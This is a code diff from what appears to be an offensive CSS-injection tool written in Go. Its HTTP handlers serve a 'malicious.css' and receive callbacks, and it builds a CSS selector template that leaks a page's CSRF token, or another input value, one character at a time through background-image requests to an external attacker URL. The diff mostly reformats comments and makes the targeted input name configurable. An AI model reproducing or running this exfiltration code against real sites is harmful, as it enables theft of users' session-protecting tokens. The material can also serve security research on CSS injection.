@@ -11,7 +11,7 @@ import (
 	"github.com/ariary/go-utils/pkg/color"
 )
 
-//FirstLoad: target load malicious.css => begin trial and errors to retrieve data
+// FirstLoad: target load malicious.css => begin trial and errors to retrieve data
 func FirstLoad(cfg *Config) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		fmt.Println("🍁 Load malicious.css")
@@ -19,8 +19,8 @@ func FirstLoad(cfg *Config) http.Handler {
 	})
 }
 
-//Waiting: wait sufficient amount of data has been retrieved before
-//responding with a css payload that load background images to exfiltrate further data
+// Waiting: wait sufficient amount of data has been retrieved before
+// responding with a css payload that load background images to exfiltrate further data
 func Waiting(cfg *Config) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		len := r.URL.Query()["len"][0]
@@ -37,8 +37,8 @@ func Waiting(cfg *Config) http.Handler {
 	})
 }
 
-//Callback: Call when css condition is met ~ data has been exfiltrated. Retrieve partial token, compute len and unblock channel
-//corresponding to the next character to be found
+// Callback: Call when css condition is met ~ data has been exfiltrated. Retrieve partial token, compute len and unblock channel
+// corresponding to the next character to be found
 func Callback(cfg *Config) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		partialToken := r.URL.Query()["token"][0]
@@ -72,7 +72,7 @@ func InitTemplates(cfg *Config) {
 	var backTpl bytes.Buffer
 	tBack := template.Must(template.New("trialAndError").Parse(`}}"] { background: url({{ .ExternalUrl}}/callback?token=`))
 	tBack.Execute(&backTpl, data)
-	cfg.BackgroundTemplate = "{{range $val := .}}\ninput[name=csrf][value^=\"{{$val" + backTpl.String() + "{{$val}}); }{{end}}"
+	cfg.BackgroundTemplate = "{{range $val := .}}\ninput[name=" + cfg.Elt + "][value^=\"{{$val" + backTpl.String() + "{{$val}}); }{{end}}"
 }
 
 func craftImports(tpl string, len int) (result string, err error) {
